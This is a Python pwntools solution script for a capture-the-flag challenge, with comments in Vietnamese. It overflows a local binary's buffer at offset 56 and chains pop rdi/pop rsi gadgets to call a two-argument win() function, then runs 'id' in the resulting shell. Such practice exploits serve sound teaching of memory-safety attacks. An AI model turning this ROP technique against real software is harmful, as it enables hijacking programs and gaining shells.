#!/usr/bin/env python3
# Challenge 3 (kho hon): ret2win hai tham so. a->rdi, b->rsi.
# Offset do bang cyclic = 56 (buf[40] + padding + rbp). Can 1 ret can stack.
from pwn import *

context.binary = elf = ELF('./chall3', checksec=False)
context.log_level = 'info'

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

io = process('./chall3')
io.sendafter(b'Nhap:\n', flat(
    b'A' * 56,                  # offset do bang cyclic: 56
    pop_rdi, 0xc0ffee,          # a -> rdi
    pop_rsi, 0x1337,            # b -> rsi
    ret,                        # can stack 16 byte
    elf.sym['win'],
))
# cho banner win() roi moi gui lenh (tranh race send som)
io.sendlineafter(b'Shell:\n', b'echo ===SHELL_OK===; id; exit')
print(io.recvall(timeout=3).decode(errors='replace'))
